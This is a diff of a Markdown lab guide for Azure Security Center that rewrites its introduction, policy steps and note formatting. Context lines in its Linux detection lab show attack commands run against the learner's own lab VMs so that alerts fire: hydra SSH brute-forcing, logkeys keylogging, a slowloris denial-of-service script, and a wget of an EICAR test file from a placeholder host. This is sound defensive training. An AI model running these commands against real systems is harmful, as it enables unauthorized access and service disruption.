@@ -3910,8 +3910,34 @@ To control our users sessions to Salesforce, we have now to create a **policy**.
 # Azure Security Center
 [:arrow_left: Home](#introduction)
 
-Welcome to the Azure Security Center labs! <br>
-The labs are divided into 2 tracks, a beginner (level 50/100) and an advanced (level 300+) track. <br><br>
+Azure Security Center is a unified infrastructure security management system that strengthens the security posture of your data centers, and provides advanced threat protection across your hybrid workloads in the cloud - whether they're in Azure or not - as well as on premises.
+
+Keeping your resources safe is a joint effort between your cloud provider, Azure, and you, the customer. You have to make sure your workloads are secure as you move to the cloud, and at the same time, when you move to IaaS (infrastructure as a service) there is more customer responsibility than there was in PaaS (platform as a service), and SaaS (software as a service). Azure Security Center provides you the tools needed to harden your network, secure your services and make sure you're on top of your security posture.
+
+!IMAGE[Map](\Media\sc-net-map.png)
+
+Azure Security Center addresses the three most urgent security challenges:
+
+- Rapidly changing workloads – It’s both a strength and a challenge of the cloud. On the one hand, end users are empowered to do more. On the other, how do you make sure that the ever-changing services people are using and creating are up to your security standards and follow security best practices?
+	!IMAGE[score](\Media\sc-secure-score.png)
+
+- Increasingly sophisticated attacks - Wherever you run your workloads, the attacks keep getting more sophisticated. You have to secure your public cloud workloads, which are, in effect, an Internet facing workload that can leave you even more vulnerable if you don't follow security best practices.
+	!IMAGE[score](\Media\sc-recommendations.png)
+
+- Security skills are in short supply - The number of security alerts and alerting systems far outnumbers the number of administrators with the necessary background and experience far to make sure your environments are protected. Staying up-to-date with the latest attacks is a constant challenge, making it impossible to stay in place while the world of security is an ever-changing front.
+	!IMAGE[Attacks(\Media\sc-brute-force.png)
+	
+To help you protect yourself against these challenges, Security Center provides you with the tools to:
+
+- Strengthen security posture: Security Center assesses your environment and enables you to understand the status of your resources, are they secure or not?
+	!IMAGE[Dashboard](\Media\sc-dashboard.png)
+
+- Protect against threats: Security Center assesses your workloads and raises threat prevention recommendations and threat detection alerts.
+	!IMAGE[sc-attack-recommendation.png](\Media\sc-attack-recommendation.png)
+
+- Get secure faster: In Security Center, everything is done in cloud speed. Because it is natively integrated, deployment of Security Center is easy, providing you with autoprovisioning and protection with Azure services.
+
+The Azure Security Center labs are divided into 2 tracks, a beginner (level 50/100) and an advanced (level 300+) track. <br><br>
 
 ## [Beginner Track](#beginner-track)
 
@@ -4029,8 +4055,6 @@ The example above is based on Container security monitoring (you have a lab that
 
 This lab covers ASC Policy and Regulatory Compliance and guides you through some preview features.<br>
 
-This lab covers ASC Policy and Regulatory Compliance and guides you through the preview features.<br>
-
 ### Regulatory Compliance (Preview)
 From the Azure Security Center overview blade, click on the **Least compliant regulatory standards** tile: <br><br>
 !IMAGE[alt text](\Media\policy_compliance_dashboard.png)<br><br>
@@ -4043,21 +4067,22 @@ When you click on **All** you will see an overview of all the Regulatory Complia
 !IMAGE[alt text](\Media\policy_compliance_all.png)<br><br>
 
 ### Policy Management
-This exercise guides you through the current Security Center policies and is intended for exploration purposes only. <br>
+This exercise guides you through the current Security Center policies, based on Azure Policy, and shows you where to enable or disable Security Center polices. <br>
 
-***Note**: at this time we only support out-of-the-box Security Center policies. Support for custom policies is coming in the near future*
+> [!NOTE] at this time we only support out-of-the-box Security Center policies. Support for custom policies is coming in the near future*
 
-1. [] Within the Azure portal, navigate to the **Policy** blade
-2. [] Click on **Definitions** (under Authoring)
-3. [] Under **Categories**, deselect all the categories and select only **Security Center** <br><br>
-	!IMAGE[alt text](\Media\asc_policies.png)<br>
+1. Within the Azure portal, navigate to the **Policy** blade <br>
+*Note: when you can't find Policy, click in the search bar on top of the Azure portal and search for **Policy**:*
+!IMAGE[alt text](\Media\search_policy.png)<br><br>
 
-4. [] Explore the policies by clicking on them
-5. [] Notice the different icons as shown below, they represent a **Policy** and an **Initiative** (group of policies): <br>
+2. Click on **Assignments** (under Authoring)
+3. Notice the 80 policy definitions under that initiative. Click on the **[Preview]: Enable Monitoring in Azure Security Center** initiative:<br><br>
+!IMAGE[alt text](\Media\policy_assignment.png)<br><br>
+4. Clicking on the initiative allows you to disable the definition:
+!IMAGE[alt text](\Media\disable_definition.png)<br><br>
 
-	!IMAGE[alt text](\Media\initiative.png) <br><br>
+> [!NOTE] In the near future we will provide custom policies which will support deployIfNotExists type of policies*
 
-6. [] Click on each of those to explore the difference
 
 ### Continue with the next lab
 
@@ -4137,18 +4162,19 @@ Set-AzureRmJitNetworkAccessPolicy -ResourceGroupName "<rescourceGroupName>" -Loc
 In this lab we will explore the new Linux detection's in ASC by executing attacks in a Kali Linux VM that you are going to deploy. You will connect to your deployed Linux VM (Linux-0) leveraging SSH. In case you don't have a SSH client installed, you can install the free edition of MobaXterm <a href="https://mobaxterm.mobatek.net/download.html" target="_blank">here</a>.<br>
 
 #### Create a Kali Linux VM
-***Note**: time to create the Kali Linux VM is approx 3 minutes. Make sure to add a port that enables you to connect.*
+
+> [!NOTE] time to create the Kali Linux VM is approx 5 minutes. Make sure to add a port that enables you to connect.*
 
 1. [] In the Azure portal, click on **Create a resource** and search for **Kali Linux** and **create** the VM
 
 	!IMAGE[alt text](\Media\kali_marketplace.png)
 
-***Note**: you don't have to wait until the deployment is complete. Proceed with the next exercise*
+	> [!NOTE] you don't have to wait until the deployment is complete. Proceed with the next exercise*
 
 #### Create Linux users 
 1. [] Connect to your Linux VM (Linux-0) that you have deployed earlier (note: not the Kali VM), using your favorite SSH tool
 2. [] Create 5 users with the names user1, user2, user3, user4, user5, by leveraging the following Linux command <br>
-***Note**: Replace "userName" by user1, user2, etc.<br> Set the password to "mypassword1" for user1, "mypassword2" for user2, etc.*
+	> [!NOTE] Replace "userName" by user1, user2, etc.<br> Set the password to "mypassword1" for user1, "mypassword2" for user2, etc.*
 
 ```
 sudo adduser <userName>
@@ -4178,7 +4204,7 @@ hydra -I -L lab_users.txt -P lab_pass.txt <IP> -t 4 ssh
 ```
 logkeys --start
 ```
-***Note**:<br> Ignore the error message if you don't have logkeys installed. Security Center will detect this attack anyway*
+	> [!NOTE]<br> Ignore the error message if you don't have logkeys installed. Security Center will detect this attack anyway*
 
 #### Simulate an attack against a web server
 Assuming that the attacker has already performed some internal recon using nmap, you are going to simulate an attack against a web server
@@ -4186,7 +4212,7 @@ Assuming that the attacker has already performed some internal recon using nmap,
 ```
 perl slowloris.pl -dns server.contoso.com
 ```
-***Note**:<br> Ignore the error message if you don't have this script on your system. Security Center will detect this attack anyway*
+	> [!NOTE]<br> Ignore the error message if you don't have this script on your system. Security Center will detect this attack anyway*
 
 #### Command & Control (C2) simulation
 Attackers usually will communicate with command and control (C2) to transfer data or to download more  malicious software.
@@ -4200,7 +4226,7 @@ nslookup eicar.com
 ```
 wget http://XXX.XXX.XXX.XXX/download/eicar.com
 ```
-***Note**:<br>  if you have issues download eicar.com, try download eicar.txt (same command line, just change the extension).*
+	> [!NOTE]<br>  if you have issues download eicar.com, try download eicar.txt (same command line, just change the extension).*
 
 #### Review Security Center alerts
 1. [] Navigate to the **Security Center>Security Alerts** blade (under Threat Protection)
@@ -4219,12 +4245,12 @@ wget http://XXX.XXX.XXX.XXX/download/eicar.com
 # Logic Apps integration
 ##### Estimated lab time: 25 minutes
 In this lab you are going to explore the Security Center integration with Logic Apps.<br>
-***Note**: More comprehensive guidance can be found* <a href="https://techcommunity.microsoft.com/t5/Security-Identity/Automate-Azure-Security-Center-actions-with-Playbooks-and/td-p/264843" target="_blank">here</a>.
+	> [!NOTE] More comprehensive guidance can be found* <a href="https://techcommunity.microsoft.com/t5/Security-Identity/Automate-Azure-Security-Center-actions-with-Playbooks-and/td-p/264843" target="_blank">here</a>.
 
 The most asked automation integration use case is how Security Center integrates with ITSM solutions like ServiceNow, so in this lab we are going to explore exactly that integration.<br><br>
 
 #### Create an ASC test alert
-***Note**: if you want to run more validation steps to simulate attacks in VMs/Computers monitored by Azure Security Center (out of scope for this lab)* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-549aa7a4" target="_blank">go here</a><br>
+	> [!NOTE] if you want to run more validation steps to simulate attacks in VMs/Computers monitored by Azure Security Center (out of scope for this lab)* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-549aa7a4" target="_blank">go here</a><br>
 
 Before you are going to create the playbook, let's make sure that we have an ASC alert we can act upon.
 1. [] Login to your Windows VM that you have created earlier and is monitored by Security Center
@@ -4363,7 +4389,7 @@ az container create --resource-group <yourResourceGroupName> --name <yourContain
 
 	!IMAGE[alt text](\Media\resourcegroup.png) <br><br>
 
-***Note**: It takes some time for the container to become visible in Security Center* <br>
+	> [!NOTE] It takes some time for the container to become visible in Security Center* <br>
 
 #### Explore the new Container tab under Compute & Apps
 1. [] The new container view in Security Center is accessible through a feature flag. Copy and paste the following URL in your Azure portal session:
@@ -4559,7 +4585,7 @@ Security Centers stores MMA collected information (and more) in a Log Analytics 
 In the next exercise we will create a new workspace which will be used as your default ASC workspace.
 
 #### Create a Log Analytics workspace
-***Note**: if you already have deployed a Log Analytics workspace you can skip this exercise, or create a second one to test drive multiple custom workspaces reporting up to ASC.*<br>
+	> [!NOTE] if you already have deployed a Log Analytics workspace you can skip this exercise, or create a second one to test drive multiple custom workspaces reporting up to ASC.*<br>
 
 You can either create a workspace through the Azure portal, leverage an ARM template, or use PowerShell.
 1. [] Navigate to the Azure portal and create a Log Analytics workspace **OR**:
@@ -4576,7 +4602,7 @@ New-AzureRmResourceGroupDeployment -Name myWorkspaceDeploy -ResourceGroupName $R
 4. [] Click on **Security policy**
 5. [] Your new created workspace should be listed under the **Policy Management** view <br><br>
 
-***Note**: the ARM template deploys a new workspace with concatenating the workspace name with a GUID to ensure uniqueness.*
+	> [!NOTE] the ARM template deploys a new workspace with concatenating the workspace name with a GUID to ensure uniqueness.*
  
 #### Change the Pricing tier and data collection settings of your workspace 
 You can set the pricing tier and data collection settings per workspace, which is often not clear to customers, therefore we are going to set it in the portal instead of through automation (although you can automate it)
